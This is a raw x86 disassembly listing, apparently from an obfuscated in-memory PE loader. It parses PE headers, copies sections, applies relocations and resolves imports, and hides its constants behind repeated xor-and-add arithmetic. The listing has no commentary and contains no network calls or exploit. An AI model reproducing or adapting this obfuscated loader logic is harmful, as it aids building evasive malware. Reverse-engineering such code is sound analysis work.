  425f72:	mov    esi,DWORD PTR [eax+0x14]
  425f75:	mov    edi,DWORD PTR [eax+0x18]
  425f78:	add    ecx,DWORD PTR [ebp+0x8]
  425f7b:	add    edx,DWORD PTR [ebp+0x8]
  425f7e:	mov    DWORD PTR [ebp-0x4],esi
  425f81:	cmp    esi,edi
  425f83:	ja     0x425f88
  425f85:	mov    DWORD PTR [ebp-0x4],edi
  425f88:	mov    DWORD PTR [ebp-0x8],ebx
  425f8b:	cmp    DWORD PTR [ebp-0x4],ebx
  425f8e:	jbe    0x425f61
  425f90:	cmp    ebx,DWORD PTR [eax+0x14]
  425f93:	jae    0x425f9b
  425f95:	movzx  esi,WORD PTR [edx+ebx*2]
  425f99:	jmp    0x425f9d
  425f9b:	mov    esi,ebx
  425f9d:	lea    esi,[ecx+esi*4]
  425fa0:	mov    edi,DWORD PTR [esi]
  425fa2:	test   edi,edi
  425fa4:	je     0x425fcf
  425fa6:	add    edi,DWORD PTR [ebp+0x8]
  425fa9:	mov    DWORD PTR [ebp-0x10],edi
  425fac:	cmp    edi,eax
  425fae:	jbe    0x425fc0
  425fb0:	mov    ebx,DWORD PTR [ebp+0xc]
  425fb3:	mov    ebx,DWORD PTR [ebx+0x7c]
  425fb6:	add    ebx,eax
  425fb8:	cmp    edi,ebx
  425fba:	jae    0x425fc0
  425fbc:	mov    esi,DWORD PTR [esi]
  425fbe:	jmp    0x425fc8
  425fc0:	sub    edi,DWORD PTR [ebp+0x8]
  425fc3:	mov    DWORD PTR [esi],edi
  425fc5:	mov    esi,DWORD PTR [ebp-0x10]
  425fc8:	test   esi,esi
  425fca:	je     0x425fda
  425fcc:	mov    ebx,DWORD PTR [ebp-0x8]
  425fcf:	inc    ebx
  425fd0:	mov    DWORD PTR [ebp-0x8],ebx
  425fd3:	cmp    ebx,DWORD PTR [ebp-0x4]
  425fd6:	jb     0x425f90
  425fd8:	jmp    0x425f61
  425fda:	xor    eax,eax
  425fdc:	pop    edi
  425fdd:	pop    esi
  425fde:	pop    ebx
  425fdf:	leave  
  425fe0:	ret    0x8
  425fe3:	push   ebp
  425fe4:	mov    ebp,esp
  425fe6:	sub    esp,0x2c
  425fe9:	mov    edx,0xf89c85a1
  425fee:	mov    DWORD PTR [ebp-0x4],edx
  425ff1:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  425ff8:	mov    eax,DWORD PTR [ebp-0x4]
  425ffb:	mov    ecx,DWORD PTR [ebp-0x4]
  425ffe:	mov    ecx,DWORD PTR [ebp-0x4]
  426001:	mov    ecx,DWORD PTR [ebp-0x4]
  426004:	mov    ecx,DWORD PTR [ebp-0x4]
  426007:	mov    ecx,DWORD PTR [ebp-0x4]
  42600a:	push   ebx
  42600b:	mov    ebx,DWORD PTR [ebp+0x10]
  42600e:	push   esi
  42600f:	mov    esi,0x75108ac
  426014:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  42601b:	mov    ecx,DWORD PTR [ebp-0x4]
  42601e:	mov    ebx,DWORD PTR [ebx+0x190]
  426024:	push   edi
  426025:	mov    edi,0x3272f3
  42602a:	xor    ecx,esi
  42602c:	xor    eax,esi
  42602e:	add    eax,edi
  426030:	add    ecx,edi
  426032:	mov    DWORD PTR [ebp-0x18],eax
  426035:	cmp    ecx,DWORD PTR [ebx]
  426037:	je     0x4262b8
  42603d:	mov    ebx,DWORD PTR [ebp-0x4]
  426040:	mov    ecx,DWORD PTR [ebp+0xc]
  426043:	xor    ebx,esi
  426045:	add    ebx,edi
  426047:	cmp    ebx,ecx
  426049:	je     0x4262b8
  42604f:	mov    ebx,DWORD PTR [ebp-0x4]
  426052:	mov    ecx,DWORD PTR [ecx+0x80]
  426058:	xor    ebx,esi
  42605a:	add    ebx,edi
  42605c:	cmp    ecx,ebx
  42605e:	je     0x4262b3
  426064:	add    ecx,DWORD PTR [ebp+0x8]
  426067:	mov    DWORD PTR [ebp-0x2c],ecx
  42606a:	mov    ebx,edx
  42606c:	xor    ebx,esi
  42606e:	add    ebx,edi
  426070:	mov    DWORD PTR [ebp-0x10],ebx
  426073:	mov    ebx,DWORD PTR [ebp-0x10]
  426076:	cmp    ebx,edx
  426078:	je     0x42608c
  42607a:	mov    edx,DWORD PTR [ebp-0x10]
  42607d:	mov    ebx,DWORD PTR [ebp-0x4]
  426080:	imul   edx,edx,0x14
  426083:	xor    ebx,esi
  426085:	add    ebx,edi
  426087:	cmp    DWORD PTR [edx+ecx*1],ebx
  42608a:	jne    0x4260a3
  42608c:	mov    edx,DWORD PTR [ebp-0x10]
  42608f:	mov    ebx,DWORD PTR [ebp-0x4]
  426092:	imul   edx,edx,0x14
  426095:	xor    ebx,esi
  426097:	add    ebx,edi
  426099:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  42609d:	je     0x4262a5
  4260a3:	mov    eax,DWORD PTR [ebp-0x4]
  4260a6:	mov    ebx,DWORD PTR [ebp-0x4]
  4260a9:	mov    eax,DWORD PTR [ebp-0x10]
  4260ac:	imul   eax,eax,0x14
  4260af:	add    eax,ecx
  4260b1:	mov    ecx,DWORD PTR [eax+0x10]
  4260b4:	add    ecx,DWORD PTR [ebp+0x8]
  4260b7:	xor    ebx,esi
  4260b9:	mov    DWORD PTR [ebp-0x1c],ecx
  4260bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4260bf:	mov    edx,DWORD PTR [ebp-0x4]
  4260c2:	xor    ecx,esi
  4260c4:	add    ecx,edi
  4260c6:	xor    edx,esi
  4260c8:	mov    DWORD PTR [ebp-0x24],ecx
  4260cb:	mov    ecx,DWORD PTR [eax]
  4260cd:	add    edx,edi
  4260cf:	add    ebx,edi
  4260d1:	cmp    ecx,edx
  4260d3:	je     0x4260db
  4260d5:	add    ecx,DWORD PTR [ebp+0x8]
  4260d8:	mov    DWORD PTR [ebp-0x24],ecx
  4260db:	mov    ecx,DWORD PTR [ebp-0x4]
  4260de:	xor    ecx,esi
  4260e0:	add    ecx,DWORD PTR [eax+0xc]
  4260e3:	mov    eax,DWORD PTR [ebp+0x8]
  4260e6:	lea    eax,[ecx+eax*1+0x3272f3]
  4260ed:	mov    DWORD PTR [ebp+0xc],eax
  4260f0:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4260f7:	mov    eax,DWORD PTR [ebp+0x10]
  4260fa:	push   DWORD PTR [ebp+0xc]
  4260fd:	mov    eax,DWORD PTR [eax+0x1e0]
  426103:	call   DWORD PTR [eax]
  426105:	mov    ecx,DWORD PTR [ebp-0x4]
  426108:	xor    ecx,esi
  42610a:	add    ecx,edi
  42610c:	mov    DWORD PTR [ebp-0xc],eax
  42610f:	cmp    ecx,eax
  426111:	jne    0x426125
  426113:	mov    eax,DWORD PTR [ebp+0x10]
  426116:	push   DWORD PTR [ebp+0xc]
  426119:	mov    eax,DWORD PTR [eax+0x1e0]
  42611f:	call   DWORD PTR [eax+0xc]
  426122:	mov    DWORD PTR [ebp-0xc],eax
  426125:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  42612c:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  426133:	mov    eax,DWORD PTR [ebp-0x4]
  426136:	xor    eax,esi
  426138:	add    eax,edi
  42613a:	cmp    eax,DWORD PTR [ebp-0xc]
  42613d:	jne    0x426162
  42613f:	mov    eax,DWORD PTR [ebp-0x8]
  426142:	mov    ecx,DWORD PTR [ebp-0x20]
  426145:	xor    eax,esi
  426147:	xor    ecx,esi
  426149:	lea    ebx,[ebx+eax*1+0x3272f3]
  426150:	mov    eax,DWORD PTR [ebp+0x10]
  426153:	mov    eax,DWORD PTR [eax+0x1e0]
  426159:	add    ecx,edi
  42615b:	imul   ecx,ebx
  42615e:	push   ecx
  42615f:	call   DWORD PTR [eax+0x24]
  426162:	mov    eax,DWORD PTR [ebp-0x4]
  426165:	xor    eax,esi
  426167:	add    eax,edi
  426169:	cmp    eax,DWORD PTR [ebp-0xc]
  42616c:	jne    0x42617d
  42616e:	mov    eax,DWORD PTR [ebp-0x28]
  426171:	xor    eax,esi
  426173:	add    eax,edi
  426175:	cmp    ebx,eax
  426177:	jbe    0x4260f7
  42617d:	mov    eax,DWORD PTR [ebp-0x4]
  426180:	xor    eax,esi
  426182:	add    eax,edi
  426184:	cmp    eax,DWORD PTR [ebp-0xc]
  426187:	jne    0x4261a0
  426189:	mov    eax,DWORD PTR [ebp-0x8]
  42618c:	mov    ecx,DWORD PTR [ebp-0x18]
  42618f:	xor    eax,esi
  426191:	lea    eax,[ecx+eax*1+0x3272f3]
  426198:	mov    DWORD PTR [ebp-0x18],eax
  42619b:	jmp    0x42628f
  4261a0:	mov    DWORD PTR [ebp-0x14],0x1121b29
  4261a7:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  4261ae:	mov    ebx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ebx,esi
  4261b3:	add    ebx,edi
  4261b5:	jmp    0x42627c
  4261ba:	mov    eax,DWORD PTR [ebp-0x4]
  4261bd:	xor    eax,esi
  4261bf:	add    eax,edi
  4261c1:	mov    DWORD PTR [ebp-0x14],eax
  4261c4:	mov    eax,DWORD PTR [ebp-0x4]
  4261c7:	xor    eax,esi
  4261c9:	add    eax,edi
  4261cb:	mov    DWORD PTR [ebp+0xc],eax
  4261ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4261d1:	mov    eax,DWORD PTR [ebp-0x24]
  4261d4:	xor    ecx,esi
  4261d6:	add    ecx,edi
  4261d8:	cmp    ecx,eax
  4261da:	je     0x4261e2
  4261dc:	mov    eax,DWORD PTR [eax+ebx*4]
  4261df:	mov    DWORD PTR [ebp-0x14],eax
  4261e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e5:	mov    eax,DWORD PTR [eax+ebx*4]
  4261e8:	mov    DWORD PTR [ebp+0xc],eax
  4261eb:	mov    eax,DWORD PTR [ebp-0x4]
  4261ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4261f1:	xor    eax,esi
  4261f3:	add    eax,edi
  4261f5:	cmp    eax,ecx
  4261f7:	je     0x426222
  4261f9:	mov    eax,DWORD PTR [ebp-0x4]
  4261fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4261ff:	xor    eax,esi
  426201:	add    eax,edi
  426203:	shr    ecx,0x1f
  426206:	cmp    eax,ecx
  426208:	je     0x426222
  42620a:	mov    ecx,DWORD PTR [ebp-0x14]
  42620d:	mov    eax,DWORD PTR [ebp+0x10]
  426210:	mov    eax,DWORD PTR [eax+0x1e0]
  426216:	movzx  ecx,cx
  426219:	push   ecx
  42621a:	push   DWORD PTR [ebp-0xc]
  42621d:	call   DWORD PTR [eax+0x8]
  426220:	jmp    0x42623b
  426222:	mov    eax,DWORD PTR [ebp+0xc]
  426225:	add    eax,DWORD PTR [ebp+0x8]
  426228:	mov    ecx,DWORD PTR [ebp+0x10]
  42622b:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426231:	add    eax,0x2
  426234:	push   eax
  426235:	push   DWORD PTR [ebp-0xc]
  426238:	call   DWORD PTR [ecx+0x8]
  42623b:	mov    DWORD PTR [ebp+0xc],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x4]
  426241:	mov    ecx,DWORD PTR [ebp+0xc]
  426244:	xor    eax,esi
  426246:	add    eax,edi
  426248:	cmp    eax,ecx
  42624a:	mov    eax,DWORD PTR [ebp-0x8]
  42624d:	jne    0x426260
  42624f:	mov    ecx,DWORD PTR [ebp-0x18]
  426252:	xor    eax,esi
  426254:	lea    eax,[ecx+eax*1+0x3272f3]
  42625b:	mov    DWORD PTR [ebp-0x18],eax
  42625e:	jmp    0x426270
  426260:	mov    ecx,DWORD PTR [ebp+0xc]
  426263:	xor    eax,esi
  426265:	add    eax,edi
  426267:	imul   eax,ecx
  42626a:	mov    ecx,DWORD PTR [ebp-0x1c]
  42626d:	mov    DWORD PTR [ecx+ebx*4],eax
  426270:	mov    eax,DWORD PTR [ebp-0x8]
  426273:	xor    eax,esi
  426275:	lea    ebx,[ebx+eax*1+0x3272f3]
  42627c:	mov    eax,DWORD PTR [ebp-0x4]
  42627f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426282:	xor    eax,esi
  426284:	add    eax,edi
  426286:	cmp    DWORD PTR [ecx+ebx*4],eax
  426289:	jne    0x4261ba
  42628f:	mov    edx,DWORD PTR [ebp-0x10]
  426292:	mov    eax,DWORD PTR [ebp-0x18]
  426295:	mov    ecx,DWORD PTR [ebp-0x2c]
  426298:	sub    edx,0x3272f2
  42629e:	xor    edx,esi
  4262a0:	jmp    0x42606a
  4262a5:	mov    ecx,DWORD PTR [ebp-0x4]
  4262a8:	xor    ecx,esi
  4262aa:	add    ecx,edi
  4262ac:	cmp    eax,ecx
  4262ae:	mov    eax,DWORD PTR [ebp-0x4]
  4262b1:	jne    0x4262bb
  4262b3:	mov    eax,DWORD PTR [ebp-0x8]
  4262b6:	jmp    0x4262bb
  4262b8:	mov    eax,DWORD PTR [ebp-0x4]
  4262bb:	xor    eax,esi
  4262bd:	add    eax,edi
  4262bf:	pop    edi
  4262c0:	pop    esi
  4262c1:	pop    ebx
  4262c2:	leave  
  4262c3:	ret    0xc
  4262c6:	push   ebp
  4262c7:	mov    ebp,esp
  4262c9:	sub    esp,0x28
  4262cc:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  4262d3:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  4262da:	mov    eax,DWORD PTR [ebp+0xc]
  4262dd:	mov    DWORD PTR [ebp+0xc],eax
  4262e0:	push   esi
  4262e1:	mov    eax,eax
  4262e3:	mov    eax,DWORD PTR [ebp-0x4]
  4262e6:	mov    esi,DWORD PTR [ebp+0x8]
  4262e9:	mov    ecx,0x75108ac
  4262ee:	xor    eax,ecx
  4262f0:	mov    edx,0x3272f3
  4262f5:	add    eax,edx
  4262f7:	cmp    esi,eax
  4262f9:	je     0x426420
  4262ff:	mov    eax,DWORD PTR [ebp+0x8]
  426302:	mov    esi,DWORD PTR [ebp+0x8]
  426305:	add    esi,DWORD PTR [eax+0x3c]
  426308:	push   edi
  426309:	mov    DWORD PTR [ebp+0xc],esi
  42630c:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  426313:	mov    eax,DWORD PTR [ebp-0x1c]
  426316:	mov    esi,DWORD PTR [ebp-0x4]
  426319:	mov    edi,DWORD PTR [ebp+0xc]
  42631c:	xor    esi,ecx
  42631e:	xor    eax,ecx
  426320:	add    esi,edx
  426322:	cmp    DWORD PTR [edi+eax*8+0x1939810],esi
  426329:	je     0x42641a
  42632f:	mov    esi,DWORD PTR [ebp+0xc]
  426332:	mov    eax,DWORD PTR [ebp+0x8]
  426335:	add    eax,DWORD PTR [esi+0xa0]
  42633b:	mov    esi,DWORD PTR [ebp+0x8]
  42633e:	mov    edi,DWORD PTR [ebp+0xc]
  426341:	sub    esi,DWORD PTR [edi+0x34]
  426344:	mov    edi,DWORD PTR [ebp-0x4]
  426347:	xor    edi,ecx
  426349:	add    edi,edx
  42634b:	mov    DWORD PTR [ebp-0x24],esi
  42634e:	cmp    esi,edi
  426350:	je     0x42641a
  426356:	mov    esi,DWORD PTR [ebp-0x4]
  426359:	xor    esi,ecx
  42635b:	add    esi,edx
  42635d:	mov    DWORD PTR [ebp-0x8],esi
  426360:	push   ebx
  426361:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  426368:	jmp    0x426404
  42636d:	mov    esi,DWORD PTR [ebp-0x4]
  426370:	xor    esi,ecx
  426372:	lea    edi,[ebx-0x8]
  426375:	add    esi,edx
  426377:	shr    edi,1
  426379:	cmp    esi,edi
  42637b:	jae    0x4263ea
  42637d:	sub    edi,esi
  42637f:	lea    ebx,[eax+esi*2+0x8]
  426383:	mov    DWORD PTR [ebp-0x18],edi
  426386:	movzx  esi,WORD PTR [ebx]
  426389:	and    esi,0xfff
  42638f:	mov    DWORD PTR [ebp-0x14],esi
  426392:	mov    edi,DWORD PTR [ebp-0x14]
  426395:	mov    esi,DWORD PTR [eax]
  426397:	sub    esi,edx
  426399:	add    edi,esi
  42639b:	movzx  esi,WORD PTR [ebx]
  42639e:	shr    esi,0xc
  4263a1:	xor    edi,ecx
  4263a3:	mov    DWORD PTR [ebp-0x20],edi
  4263a6:	mov    DWORD PTR [ebp-0x14],esi
  4263a9:	mov    esi,DWORD PTR [ebp-0x20]
  4263ac:	mov    edi,DWORD PTR [ebp+0x8]
  4263af:	xor    esi,ecx
  4263b1:	lea    esi,[esi+edi*1+0x3272f3]
  4263b8:	mov    DWORD PTR [ebp-0x20],esi
  4263bb:	mov    esi,DWORD PTR [ebp-0x10]
  4263be:	mov    edi,DWORD PTR [ebp-0x14]
  4263c1:	xor    esi,ecx
  4263c3:	add    esi,edx
  4263c5:	cmp    edi,esi
  4263c7:	jne    0x4263df
  4263c9:	mov    esi,DWORD PTR [ebp-0x10]
  4263cc:	mov    edi,DWORD PTR [ebp-0x14]
  4263cf:	xor    esi,ecx
  4263d1:	add    esi,edx
  4263d3:	cmp    edi,esi
  4263d5:	jne    0x4263df
  4263d7:	mov    esi,DWORD PTR [ebp-0x20]
  4263da:	mov    edi,DWORD PTR [ebp-0x24]
  4263dd:	add    DWORD PTR [esi],edi
  4263df:	add    ebx,0x2
  4263e2:	dec    DWORD PTR [ebp-0x18]
  4263e5:	jne    0x426386
  4263e7:	mov    ebx,DWORD PTR [ebp-0xc]
  4263ea:	add    DWORD PTR [ebp-0x8],ebx
  4263ed:	mov    esi,DWORD PTR [ebp-0x1c]
  4263f0:	mov    edi,DWORD PTR [ebp-0x8]
  4263f3:	mov    ebx,DWORD PTR [ebp+0xc]
  4263f6:	xor    esi,ecx
  4263f8:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939814]
  4263ff:	jae    0x426419
  426401:	add    eax,DWORD PTR [ebp-0xc]
  426404:	mov    esi,DWORD PTR [ebp-0x4]
  426407:	mov    ebx,DWORD PTR [eax+0x4]
  42640a:	xor    esi,ecx
  42640c:	add    esi,edx
  42640e:	mov    DWORD PTR [ebp-0xc],ebx
  426411:	cmp    ebx,esi
  426413:	jne    0x42636d
  426419:	pop    ebx
  42641a:	mov    eax,DWORD PTR [ebp-0x28]
  42641d:	pop    edi
  42641e:	jmp    0x426423
  426420:	mov    eax,DWORD PTR [ebp-0x4]
  426423:	xor    eax,ecx
  426425:	add    eax,edx
  426427:	pop    esi
  426428:	leave  
  426429:	ret    0x8
  42642c:	push   ebp
  42642d:	mov    ebp,esp
  42642f:	sub    esp,0xd8
  426435:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  42643c:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  426443:	mov    eax,DWORD PTR [ebp-0x4]
  426446:	push   ebx
  426447:	push   esi
  426448:	mov    esi,0x75108ac
  42644d:	xor    eax,esi
  42644f:	push   edi
  426450:	mov    edi,0x3272f3
  426455:	add    eax,edi
  426457:	mov    DWORD PTR [ebp-0x18],eax
  42645a:	mov    eax,DWORD PTR [ebp-0x4]
  42645d:	xor    eax,esi
  42645f:	add    eax,edi
  426461:	mov    DWORD PTR [ebp-0x8],eax
  426464:	mov    ebx,DWORD PTR [ebp+0x20]
  426467:	mov    eax,DWORD PTR [ebp-0x1c]
  42646a:	mov    ecx,DWORD PTR [ebp-0x1c]
  42646d:	xor    eax,ecx
  42646f:	mov    DWORD PTR [ebp-0x1c],eax
  426472:	add    DWORD PTR [ebp-0x1c],0xf89cb5a1
  426479:	mov    eax,DWORD PTR [ebp-0xc]
  42647c:	mov    ecx,DWORD PTR [ebp-0xc]
  42647f:	xor    eax,ecx
  426481:	mov    DWORD PTR [ebp-0xc],eax
  426484:	add    DWORD PTR [ebp-0xc],0xf89c85e1
  42648b:	mov    eax,DWORD PTR [ebp-0x10]
  42648e:	mov    ecx,DWORD PTR [ebp-0x10]
  426491:	xor    eax,ecx
  426493:	mov    DWORD PTR [ebp-0x10],eax
  426496:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  42649d:	mov    eax,DWORD PTR [ebp-0x28]
  4264a0:	mov    ecx,DWORD PTR [ebp-0x28]
  4264a3:	xor    eax,ecx
  4264a5:	mov    DWORD PTR [ebp-0x28],eax
  4264a8:	add    DWORD PTR [ebp-0x28],0xf89f05a1
  4264af:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4264b6:	mov    eax,DWORD PTR [ebp+0x8]
  4264b9:	test   eax,eax
  4264bb:	je     0x426944
  4264c1:	mov    eax,DWORD PTR [ebp+0xc]
  4264c4:	test   eax,eax
  4264c6:	je     0x426944
  4264cc:	mov    eax,DWORD PTR [ebp+0x18]
  4264cf:	test   eax,eax
  4264d1:	je     0x426944
  4264d7:	mov    eax,DWORD PTR [ebp+0x20]
  4264da:	mov    ecx,DWORD PTR [ebp+0x8]
  4264dd:	xor    eax,0x8ac
  4264e2:	add    eax,0x72f3
  4264e7:	cmp    WORD PTR [ecx],ax
  4264ea:	jne    0x426944
  4264f0:	mov    eax,DWORD PTR [ebp-0x4]
  4264f3:	xor    eax,esi
  4264f5:	add    eax,edi
  4264f7:	mov    DWORD PTR [ebp-0x30],eax
  4264fa:	mov    eax,DWORD PTR [ebp-0x4]
  4264fd:	mov    ecx,DWORD PTR [ebp+0x8]
  426500:	mov    eax,DWORD PTR [ebp+0x8]
  426503:	add    eax,DWORD PTR [ecx+0x3c]
  426506:	mov    DWORD PTR [ebp+0xc],eax
  426509:	mov    eax,DWORD PTR [eax+0x50]
  42650c:	test   eax,eax
  42650e:	je     0x426944
  426514:	mov    DWORD PTR [ebp-0x2c],0xf88c85a1
  42651b:	mov    eax,DWORD PTR [ebp-0x2c]
  42651e:	xor    eax,esi
  426520:	add    eax,edi
  426522:	mov    DWORD PTR [ebp-0x2c],eax
  426525:	mov    eax,DWORD PTR [ebp-0x4]
  426528:	mov    eax,DWORD PTR [ebx+0x190]
  42652e:	mov    ecx,DWORD PTR [eax]
  426530:	mov    ecx,DWORD PTR [ecx+0x3c]
  426533:	add    ecx,DWORD PTR [eax]
  426535:	mov    eax,DWORD PTR [ebp-0x4]
  426538:	mov    eax,DWORD PTR [ebx+0x18c]
  42653e:	mov    edx,DWORD PTR [eax]
  426540:	mov    DWORD PTR [ebp-0x20],ecx
  426543:	mov    DWORD PTR [ebp+0x20],edx
  426546:	cmp    edx,edx
  426548:	jne    0x42657c
  42654a:	mov    eax,DWORD PTR [ebx+0x1e0]
  426550:	lea    edx,[ebp-0x18]
  426553:	push   edx
  426554:	mov    edx,DWORD PTR [ebp-0xc]
  426557:	xor    edx,esi
  426559:	add    edx,edi
  42655b:	push   edx
  42655c:	push   DWORD PTR [ecx+0x50]
  42655f:	push   DWORD PTR [ebp+0x20]
  426562:	call   DWORD PTR [eax+0x1c]
  426565:	mov    eax,DWORD PTR [ebp-0x20]
  426568:	mov    ecx,DWORD PTR [eax+0x54]
  42656b:	mov    eax,DWORD PTR [eax+0x50]
  42656e:	sub    eax,ecx
  426570:	add    ecx,DWORD PTR [ebp+0x20]
  426573:	push   ecx
  426574:	call   0x426ee1
  426579:	mov    edx,DWORD PTR [ebp+0x20]
  42657c:	mov    eax,DWORD PTR [ebx+0x194]
  426582:	mov    DWORD PTR [eax],edx
  426584:	mov    eax,DWORD PTR [ebp+0xc]
  426587:	push   DWORD PTR [eax+0x54]
  42658a:	push   DWORD PTR [ebp+0x8]
  42658d:	push   edx
  42658e:	call   0x426dd7
  426593:	mov    ecx,DWORD PTR [ebp+0x20]
  426596:	mov    eax,DWORD PTR [ecx+0x3c]
  426599:	add    eax,ecx
  42659b:	movzx  ecx,WORD PTR [eax+0x14]
  42659f:	lea    ecx,[ecx+eax*1+0x18]
  4265a3:	mov    DWORD PTR [ebp+0x18],ecx
  4265a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4265a9:	movzx  edx,WORD PTR [eax+0x6]
  4265ad:	xor    ecx,esi
  4265af:	add    ecx,edi
  4265b1:	mov    DWORD PTR [ebp+0xc],eax
  4265b4:	cmp    edx,ecx
  4265b6:	je     0x426663
  4265bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4265bf:	xor    ecx,esi
  4265c1:	add    ecx,edi
  4265c3:	mov    DWORD PTR [ebp-0x8],ecx
  4265c6:	mov    ecx,DWORD PTR [ebp-0x24]
  4265c9:	movzx  edx,WORD PTR [eax+0x6]
  4265cd:	xor    ecx,esi
  4265cf:	sub    edx,ecx
  4265d1:	sub    edx,edi
  4265d3:	cmp    DWORD PTR [ebp-0x8],edx
  4265d6:	ja     0x426663
  4265dc:	mov    edx,DWORD PTR [ebp+0x18]
  4265df:	add    edx,0x8
  4265e2:	mov    DWORD PTR [ebp+0x18],edx
  4265e5:	jmp    0x4265ea
  4265e7:	mov    edx,DWORD PTR [ebp+0x18]
  4265ea:	mov    eax,DWORD PTR [eax+0x38]
  4265ed:	lea    ecx,[eax-0x1]
  4265f0:	mov    DWORD PTR [ebp-0x38],eax
  4265f3:	mov    eax,DWORD PTR [edx]
  4265f5:	test   eax,ecx
  4265f7:	je     0x426600
  4265f9:	not    ecx
  4265fb:	and    eax,ecx
  4265fd:	add    eax,DWORD PTR [ebp-0x38]
  426600:	mov    ecx,DWORD PTR [edx+0x4]
  426603:	add    ecx,DWORD PTR [ebp+0x20]
  426606:	push   ecx
  426607:	call   0x426ee1
  42660c:	mov    edx,DWORD PTR [ebp-0x4]
  42660f:	mov    eax,DWORD PTR [ebp+0x18]
  426612:	mov    ecx,DWORD PTR [eax+0x8]
  426615:	xor    edx,esi
  426617:	add    edx,edi
  426619:	cmp    ecx,edx
  42661b:	je     0x426634
  42661d:	push   ecx
  42661e:	mov    ecx,DWORD PTR [ebp+0x8]
  426621:	add    ecx,DWORD PTR [eax+0xc]
  426624:	mov    eax,DWORD PTR [eax+0x4]
  426627:	add    eax,DWORD PTR [ebp+0x20]
  42662a:	push   ecx
  42662b:	push   eax
  42662c:	call   0x426dd7
  426631:	mov    eax,DWORD PTR [ebp+0x18]
  426634:	mov    ecx,DWORD PTR [ebp-0x24]
  426637:	mov    edx,DWORD PTR [ebp-0x8]
  42663a:	add    eax,0x28
  42663d:	xor    ecx,esi
  42663f:	lea    ecx,[edx+ecx*1+0x3272f3]
  426646:	mov    edx,DWORD PTR [ebp+0xc]
  426649:	mov    DWORD PTR [ebp+0x18],eax
  42664c:	mov    eax,DWORD PTR [ebp-0x24]
  42664f:	movzx  edx,WORD PTR [edx+0x6]
  426653:	xor    eax,esi
  426655:	sub    edx,eax
  426657:	mov    eax,DWORD PTR [ebp+0xc]
  42665a:	sub    edx,edi
  42665c:	mov    DWORD PTR [ebp-0x8],ecx
  42665f:	cmp    ecx,edx
  426661:	jbe    0x4265e7
  426663:	mov    edx,DWORD PTR [ebx+0x18c]
  426669:	mov    ecx,DWORD PTR [ebp+0x20]
  42666c:	cmp    ecx,DWORD PTR [edx]
  42666e:	jne    0x426697
  426670:	mov    eax,DWORD PTR [ebx+0x1e0]
  426676:	lea    edx,[ebp-0x18]
  426679:	push   edx
  42667a:	mov    edx,DWORD PTR [ebp-0x10]
  42667d:	xor    edx,esi
  42667f:	add    edx,edi
  426681:	push   edx
  426682:	mov    edx,DWORD PTR [ebp-0x20]
  426685:	push   DWORD PTR [edx+0x54]
  426688:	push   ecx
  426689:	call   DWORD PTR [eax+0x1c]
  42668c:	test   eax,eax
  42668e:	je     0x426935
  426694:	mov    eax,DWORD PTR [ebp+0xc]
  426697:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42669d:	mov    ecx,DWORD PTR [ecx]
  42669f:	xor    ecx,esi
  4266a1:	add    ecx,edi
  4266a3:	je     0x426860
  4266a9:	mov    eax,DWORD PTR [ebp-0x4]
  4266ac:	xor    eax,esi
  4266ae:	add    eax,edi
  4266b0:	and    DWORD PTR [ebp+0x8],0x0
  4266b4:	mov    DWORD PTR [ebp-0x14],eax
  4266b7:	mov    eax,0xf89c85dd
  4266bc:	lea    ecx,[eax-0x8]
  4266bf:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4266c6:	mov    DWORD PTR [ebp-0x54],0xf89c852d
  4266cd:	mov    DWORD PTR [ebp-0x50],eax
  4266d0:	mov    DWORD PTR [ebp-0x4c],ecx
  4266d3:	mov    DWORD PTR [ebp-0x48],ecx
  4266d6:	mov    DWORD PTR [ebp-0x44],0xf89c85a1
  4266dd:	mov    edx,DWORD PTR [ebp+0x8]
  4266e0:	mov    ecx,0x8ac
  4266e5:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4266ea:	mov    edx,0x72f3
  4266ef:	add    cx,dx
  4266f2:	mov    edx,DWORD PTR [ebp+0x8]
  4266f5:	inc    DWORD PTR [ebp+0x8]
  4266f8:	cmp    DWORD PTR [ebp+0x8],0x6
  4266fc:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426704:	jb     0x4266dd
  426706:	mov    ecx,0xf89c85d3
  42670b:	mov    DWORD PTR [ebp-0xb0],eax
  426711:	mov    DWORD PTR [ebp-0x9c],eax
  426717:	mov    DWORD PTR [ebp-0x74],eax
  42671a:	mov    DWORD PTR [ebp-0x70],eax
  42671d:	mov    eax,0xf89c852c
  426722:	lea    edx,[ecx+0x2c]
  426725:	mov    DWORD PTR [ebp-0x64],eax
  426728:	mov    DWORD PTR [ebp-0x60],eax
  42672b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f5
  426735:	mov    DWORD PTR [ebp-0xac],ecx
  42673b:	mov    DWORD PTR [ebp-0xa8],edx
  426741:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  42674b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426755:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  42675f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
